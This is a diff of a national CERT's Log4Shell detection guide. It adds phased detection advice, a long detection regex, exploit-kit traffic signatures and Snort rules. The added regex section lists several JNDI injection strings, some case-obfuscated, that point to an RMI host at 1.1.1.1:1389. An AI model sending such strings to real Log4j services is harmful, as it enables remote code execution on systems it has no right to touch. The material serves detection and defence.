@@ -5,28 +5,133 @@ This page contains an overview of any detection and mitigation software regardin
 However, NCSC-NL strives to provide rules and detection and mitigation software from reliable sources.**
 
 Table of Contents:
-1. [Detection](#detection)
+1. [Detection Guidance](#detection-guidance)
+    - [Phase 1: Identify who is scanning the environment for vulnerable machines.](#phase-1-identify-who-is-scanning-the-environment-for-vulnerable-machines)
+    - [Phase 2: Identify if a vulnerable application has attempted to retrieve the malicious code for potential execution.](#phase-2-identify-if-a-vulnerable-application-has-attempted-to-retrieve-the-malicious-code-for-potential-execution)
+    - [Phase 3: Download of the malicious code and execution of the malicious code on the vulnerable machine.](#phase-3-download-of-the-malicious-code-and-execution-of-the-malicious-code-on-the-vulnerable-machine)
+2. [Detection](#detection)
     - [Overall JNDI detection regex](#overall-jndi-detection-regex)
     - [Behavior of injected JNDI strings in vulnerable Log4J instances](#behavior-of-injected-jndi-strings-in-vulnerable-log4j-instances)
-2. [Opensource Intelligence](#opensource-intelligence)
+    - [Metadata Detection](#metadata-detection)
+    - [SNORT Rules](#snort-rules)
+    - [PCAP Examples with JNDI exploits](#pcap-examples-with-jndi-exploits)
+4. [Opensource Intelligence](#opensource-intelligence)
     - [Network based detection](#network-based-detection)
     - [Web-server mitigation](#web-server-mitigation)
     - [Host based detection](#host-based-detection)
     - [Generic detection guidance](#generic-detection-guidance)
-3. [Closed source intelligence](#closed-source-intelligence)
+5. [Closed source intelligence](#closed-source-intelligence)
 
-## Detection
+## Detection Guidance
+![](Detection_Guidance.png)
+** Credits to Deloitte and GovCERT.ch for the [image and the report](Log4j%20Attack%20Detection%20Guidance%20-%20Release.pdf) on which this section is based.
+
+Detection can be split up to three phases:
+1. [Identify who is scanning the environment for vulnerable machines.](#phase-1-identify-who-is-scanning-the-environment-for-vulnerable-machines)
+2. [Identify if a vulnerable application has attempted to retrieve the malicious code for potential execution.](#phase-2-identify-if-a-vulnerable-application-has-attempted-to-retrieve-the-malicious-code-for-potential-execution)
+3. [Download of the malicious code and execution of the malicious code on the vulnerable machine.](#phase-3-download-of-the-malicious-code-and-execution-of-the-malicious-code-on-the-vulnerable-machine)
+
+### Phase 1: Identify who is scanning the environment for vulnerable machines
+
+**Detection:**
+1. Scan inbound requests in the proxy/firewall/load balancer logs.
+2. Investigate the application logs to determine web requests which contain indicators of scanning attempts.
+3. Identify the source and protocol used by the attack.
+
+**Logs:**
+1. Web proxy (inbound)
+   - See the [JNDI regex guide](#overall-jndi-detection-regex).
+2. Firewall (inbound)
+   - See the [JNDI regex guide](#overall-jndi-detection-regex).
+3. Web application firewall (inbound)
+   - See the [JNDI regex guide](#overall-jndi-detection-regex).
+4. Load balancer (inbound)
+   - See the [JNDI regex guide](#overall-jndi-detection-regex).
+5. IDS/IPS (across the network)
+   - See the [JNDI regex guide](#overall-jndi-detection-regex).
+6. Application logs (Log4J) (inbound)    - See [here](#behavior-of-injected-jndi-strings-in-vulnerable-log4j-instances) for more information about the log-writing behavior of vulnerable Log4J instances.
+7. IP addresses of attackers which are known to actively exploit the vulnerability (enrichment)
+   - See [../iocs/README.md]
+
+**Conclusion:**
+1. Somebody has scanned your asset to identify if it is vulnerable.
+
+### Phase 2: Identify if a vulnerable application has attempted to retrieve the malicious code for potential execution.
+
+**Detection:**
+1. Identify whether the outbound request has been blocked or allowed.
+2. Identify the source IP of the attack and determine if the IP is known to present a malicious payload to execute code or if the IP has been used to scan for vulnerabilities to obtain risk context.
+
+**Logs:**
+1. Web proxy (outbound) 
+   - See the [JNDI regex guide](#overall-jndi-detection-regex).
+2. Firewall (outbound)
+   - See the [JNDI regex guide](#overall-jndi-detection-regex).
+3. Load balancer (outbound)
+   - See the [JNDI regex guide](#overall-jndi-detection-regex).
+4. IDS/IPS (across the network)
+   - See the [JNDI regex guide](#overall-jndi-detection-regex).
+5. Machine logs (Sysmon/security logs)
+   - See [here](#behavior-of-injected-jndi-strings-in-vulnerable-log4j-instances) for more information about the log-writing behavior of vulnerable Log4J instances.
+6. IP addresses of attackers which are known to actively exploit the vulnerability (enrichment)
+   - See [../iocs/README.md]
+
+**Conclusion:**
+1. The targeted application is vulnerable and has contacted the remote server to download a payload. You still need to verify whether this was a scan from a benign actor or an actual attack, by verifying whether a malicious payload was retrieved to the application’s host.
+
+### Phase 3: Download of the malicious code and execution of the malicious code on the vulnerable machine
+
+**Detection:**
+1. Identify if the malicious payload has passed any network device (proxy, firewall, load balancer, IDS/IPS).
+2. Investigate the local machine if the server process has initiated any new child processes which show signs of malicious intent.
+3. Generic signs of command-and-control or beaconing traffic.
+
+**Logs:**
+1. Web proxy (inbound)
+   - See the [JNDI regex guide](#overall-jndi-detection-regex).
+2. Firewall (inbound)
+   - See the [JNDI regex guide](#overall-jndi-detection-regex).
+3. Load balancer (inbound)
+   - See the [JNDI regex guide](#overall-jndi-detection-regex).
+4. IDS/IPS (across the network)
+   - See the [JNDI regex guide](#overall-jndi-detection-regex).
+5. Application logs (Log4J) (inbound)    - See [here](#behavior-of-injected-jndi-strings-in-vulnerable-log4j-instances) for more information about the log-writing behavior of vulnerable Log4J instances.
+6. Machine logs (Sysmon/security logs)
+   - Some exploitation attempts have been observed where Log4J crashes while attempting to execute a malicious LDAP payload. Machine/System logs might provide stack traces of these failures.
+7. Process monitoring
+
+**Conclusion:**
+1. The targeted application has downloaded the
+   malicious payload. Execution of the payload can be
+   identified through host-based process monitoring and
+   forensic analysis.
+
+## Detection 
 ### Overall JNDI detection regex
 
 ```plain
-\${(\${(.*?:|.*?:.*?:-)('|"|`)*(?1)}*|[jndi:lapsrm]('|"|`)*}*){9,11}
+${jndi:rmi://1.1.1[.]1:1389/Binary}
+${jndi:rmi://1.1.1.1:1389/Binary}
+${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://1.1.1.1:1389/Binary}
+${jndi:rmi://1.1.1.1:1389/Binary}
+${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://1.1.1.1/Binary}
+${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://1.1.1.1:1389/Binary}
+${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://1.1.1.1:1389/Binary}
+${${lower:${lower:jndi}}:${lower:rmi}://1.1.1.1:1389/Binary}
 ```
+
+```plain
+(?im)(?:^|[\n]).*?(?:[\x24]|%(?:25%?)*24|\\u?0*(?:44|24))(?:[\x7b]|%(?:25%?)*7b|\\u?0*(?:7b|173))[^\n]*?((?:j|%(?:25%?)*(?:4a|6a)|\\u?0*(?:112|6a|4a|152))[^\n]*?(?:n|%(?:25%?)*(?:4e|6e)|\\u?0*(?:4e|156|116|6e))[^\n]*?(?:d|%(?:25%?)*(?:44|64)|\\u?0*(?:44|144|104|64))[^\n]*?(?:[i\x{130}\x{131}]|%(?:25%?)*(?:49|69|C4%(?:25%?)*B0|C4%(?:25%?)*B1)|\\u?0*(?:111|69|49|151|130|460|131|461))[^\n]*?(?:[\x3a]|%(?:25%?)*3a|\\u?0*(?:72|3a))[^\n]*?((?:l|%(?:25%?)*(?:4c|6c)|\\u?0*(?:154|114|6c|4c))[^\n]*?(?:d|%(?:25%?)*(?:44|64)|\\u?0*(?:44|144|104|64))[^\n]*?(?:a|%(?:25%?)*(?:41|61)|\\u?0*(?:101|61|41|141))[^\n]*?(?:p|%(?:25%?)*(?:50|70)|\\u?0*(?:70|50|160|120))(?:[^\n]*?(?:[s\x{17f}]|%(?:25%?)*(?:53|73|C5%(?:25%?)*BF)|\\u?0*(?:17f|123|577|73|53|163)))?|(?:r|%(?:25%?)*(?:52|72)|\\u?0*(?:122|72|52|162))[^\n]*?(?:m|%(?:25%?)*(?:4d|6d)|\\u?0*(?:4d|155|115|6d))[^\n]*?(?:[i\x{130}\x{131}]|%(?:25%?)*(?:49|69|C4%(?:25%?)*B0|C4%(?:25%?)*B1)|\\u?0*(?:111|69|49|151|130|460|131|461))|(?:d|%(?:25%?)*(?:44|64)|\\u?0*(?:44|144|104|64))[^\n]*?(?:n|%(?:25%?)*(?:4e|6e)|\\u?0*(?:4e|156|116|6e))[^\n]*?(?:[s\x{17f}]|%(?:25%?)*(?:53|73|C5%(?:25%?)*BF)|\\u?0*(?:17f|123|577|73|53|163))|(?:n|%(?:25%?)*(?:4e|6e)|\\u?0*(?:4e|156|116|6e))[^\n]*?(?:[i\x{130}\x{131}]|%(?:25%?)*(?:49|69|C4%(?:25%?)*B0|C4%(?:25%?)*B1)|\\u?0*(?:111|69|49|151|130|460|131|461))[^\n]*?(?:[s\x{17f}]|%(?:25%?)*(?:53|73|C5%(?:25%?)*BF)|\\u?0*(?:17f|123|577|73|53|163))|(?:[^\n]*?(?:[i\x{130}\x{131}]|%(?:25%?)*(?:49|69|C4%(?:25%?)*B0|C4%(?:25%?)*B1)|\\u?0*(?:111|69|49|151|130|460|131|461))){2}[^\n]*?(?:o|%(?:25%?)*(?:4f|6f)|\\u?0*(?:6f|4f|157|117))[^\n]*?(?:p|%(?:25%?)*(?:50|70)|\\u?0*(?:70|50|160|120))|(?:c|%(?:25%?)*(?:43|63)|\\u?0*(?:143|103|63|43))[^\n]*?(?:o|%(?:25%?)*(?:4f|6f)|\\u?0*(?:6f|4f|157|117))[^\n]*?(?:r|%(?:25%?)*(?:52|72)|\\u?0*(?:122|72|52|162))[^\n]*?(?:b|%(?:25%?)*(?:42|62)|\\u?0*(?:102|62|42|142))[^\n]*?(?:a|%(?:25%?)*(?:41|61)|\\u?0*(?:101|61|41|141))|(?:n|%(?:25%?)*(?:4e|6e)|\\u?0*(?:4e|156|116|6e))[^\n]*?(?:d|%(?:25%?)*(?:44|64)|\\u?0*(?:44|144|104|64))[^\n]*?(?:[s\x{17f}]|%(?:25%?)*(?:53|73|C5%(?:25%?)*BF)|\\u?0*(?:17f|123|577|73|53|163))|(?:h|%(?:25%?)*(?:48|68)|\\u?0*(?:110|68|48|150))(?:[^\n]*?(?:t|%(?:25%?)*(?:54|74)|\\u?0*(?:124|74|54|164))){2}[^\n]*?(?:p|%(?:25%?)*(?:50|70)|\\u?0*(?:70|50|160|120))(?:[^\n]*?(?:[s\x{17f}]|%(?:25%?)*(?:53|73|C5%(?:25%?)*BF)|\\u?0*(?:17f|123|577|73|53|163)))?)[^\n]*?(?:[\x3a]|%(?:25%?)*3a|\\u?0*(?:72|3a))|(?:b|%(?:25%?)*(?:42|62)|\\u?0*(?:102|62|42|142))[^\n]*?(?:a|%(?:25%?)*(?:41|61)|\\u?0*(?:101|61|41|141))[^\n]*?(?:[s\x{17f}]|%(?:25%?)*(?:53|73|C5%(?:25%?)*BF)|\\u?0*(?:17f|123|577|73|53|163))[^\n]*?(?:e|%(?:25%?)*(?:45|65)|\\u?0*(?:45|145|105|65))[^\n]*?(?:[\x3a]|%(?:25%?)*3a|\\u?0*(?:72|3a))(JH[s-v]|[\x2b\x2f-9A-Za-z][CSiy]R7|[\x2b\x2f-9A-Za-z]{2}[048AEIMQUYcgkosw]ke[\x2b\x2f-9w-z]))
+```
+Source: https://github.com/back2root/log4shell-rex
+
+RegEx101: https://regex101.com/r/KqGG3W/24
 
 #### Caveats
 - Please note that due to nested resolution of `${...}` and multiple available obfuscation methods, this regular expression may not detect all forms of exploitation. It is impossible to write exhaustive regular expression.
 - This regular expression only works on URL-decoded logs. URL encoding is a popular second layer of obfuscation currently in use by attackers. 
 
-> **Warning:** In a non-vulnerable Log4J instance injected JNDI strings will be logged but not evaluated. However the presence of injected JNDI strings in log files written to by Log4J does not mean your Log4J instance is not vulnerable, since JNDI strings might also be logged (and evaluated) in vulnerable Log4J instances. See the section [Behavior of injected JNDI strings in vulnerable Log4J instances](#behavior-of-injected-jndi-strings-in-vulnerable-log4j-instances) below for more details.
+> **Warning:** In a non-vulnerable Log4J instance injected JNDI strings will be logged by Log4J but not evaluated. However the presence of injected JNDI strings in log files written to by Log4J does not mean your Log4J instance is not vulnerable, since JNDI strings might also be logged (and evaluated) in vulnerable Log4J instances. See the section [Behavior of injected JNDI strings in vulnerable Log4J instances](#behavior-of-injected-jndi-strings-in-vulnerable-log4j-instances) below for more details.
 
 ### Behavior of injected JNDI strings in vulnerable Log4J instances
 Injected JNDI strings are displayed differently in log files written to by a vulnerable Log4J instance depending on the situation. A JNDI string is always evaluated first (e.g. a DNS/LDAP/RMI request is sent). Depending on the response a different result is logged:
@@ -56,6 +161,41 @@ More generic strings:
 com.sun.jndi.
 Error looking up JNDI resource
 ```
+
+### Metadata Detection
+Metadata detection rules for web traffic:
+```
+JNDIExploit
+http.method = 'GET'
+http.uri = '/Exploit[a-zA-Z0-9]{10}.class'
+http.user_agent = 'Java/.*' (depends on version installed on system)
+http.response_mime_type = 'application/x-java-applet'
+http.response_body = Java-class file (0xcafebabe00 file magic)
+
+JNDI-Exploit-Kit
+http.method = 'GET'
+http.uri = '/ExecTemplateJDK[5678].class'
+User-agent = 'Java/.*' (depends on version installed on system)
+http.response_mime_type = 'application/x-java-applet'
+http.response_body = Java-class file (0xcafebabe00 file magic)
+
+Marshallsec
+http.uri = '*.class'
+http.user_agent = 'Java/.*' (depends on version installed on system)
+http.response_mime_type = 'application/x-java-applet'
+http.response_body = Java-class file (0xcafebabe00 file magic)
+```
+
+### Snort Rules
+```
+alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:"Detection - Log4j LDAP searchResEntry response with javaSerializedData - JNDI-Exploit-Kit"; content:"|30|"; depth:1; content:"|64|"; within:8; content:"javaSerializedData"; content: "javaCodeBase"; content: "http"; within:8; content:"javaClassName"; sid:21122001; priority:1;)
+alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:"Detection - Log4j LDAP response with JNDIExploit framework attributes"; content:"|30|"; depth:1; content:"|64|"; within:8; content:"javaClassName"; content:"javaCodeBase"; content:"http"; within:8; content:"objectClass"; content:"javaFactory"; sid:21122002; priority:1;)
+alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:"Detection - Log4j LDAP searchResEntry response with javaSerializedData - JNDIExploit"; content:"|30|"; depth:1; content:"|64|"; within:8; content: "javaClassName"; content:"javaSerializedData"; sid:21122003; priority:1;)
+alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:"Detection - Log4J RMI ReturnData with Java Serialized Object"; content:"|51 ac ed 00 05|"; depth:5; sid:21122004; priority:2;)
+```
+
+### PCAP Examples with JNDI exploits
+For PCAP examples with JNDI exploits see [here](../detection_mitigation/Examples)
 
 ## Opensource Intelligence
 ### Network based detection
@@ -95,7 +235,7 @@ ModSecurity OWASP CoreRuleSet :
 
 | Source      | Notes        | Links |
 |:----------------|:----------------|:---------------:|
-| w4rguy   | Gerrit Kortlever guidance on which detections can take place in different steps of the attack, which conclusions can be derived from them and which logs are required to detect the attempts | https://github.com/NCSC-NL/log4shell/tree/main/mitigation/Log4j%20Attack%20Detection%20Guidance%20-%20Release.pdf |
+| w4rguy   | Gerrit Kortlever guidance on which detections can take place in different steps of the attack, which conclusions can be derived from them and which logs are required to detect the attempts | https://github.com/NCSC-NL/log4shell/blob/main/detection_mitigation/Log4j%20Attack%20Detection%20Guidance%20-%20Release.pdf |
 
 ## Closed source intelligence
 
@@ -119,8 +259,9 @@ ModSecurity OWASP CoreRuleSet :
 | Tenable  | Nessus, Cloud and on prem | https://community.tenable.com/s/article/Plugins-associated-with-CVE-2021-44228-Log4Shell  |
 | Trend Micro | Cloud One| LI Rule 1011241 (See also https://success.trendmicro.com/solution/000289946) |
 | Qualys  | Cloud Platform | https://blog.qualys.com/vulnerabilities-threat-research/2021/12/10/apache-log4j2-zero-day-exploited-in-the-wild-log4shell |
-| RSA  | NetWitness | client.all contains "${j" || client.all contains "${J" for possible exploitation use direction = 'outbound' && filetype = 'java class' |
 | Rapid7   | InsightVM and Nexpose | https://www.rapid7.com/blog/post/2021/12/10/widespread-exploitation-of-critical-remote-code-execution-in-apache-log4j/ |
+| RSA  | NetWitness | client.all contains "${j" || client.all contains "${J" for possible exploitation use direction = 'outbound' && filetype = 'java class' |
+| Rubrik | Rubrik API | https://www.rubrik.com/blog/technology/2021/12/discovering-log4j-using-rubrik-apis |
 | Secure2me | Network Intrusion Detection | https://www.secureme2.eu/log4j2-vulnerability/ |
 | Splunk | Splunk | https://www.splunk.com/en_us/blog/security/log-jammin-log4j-2-rce.html |
 | Splunk | Splunk | https://www.splunk.com/en_us/blog/security/log4shell-detecting-log4j-vulnerability-cve-2021-44228-continued.html |
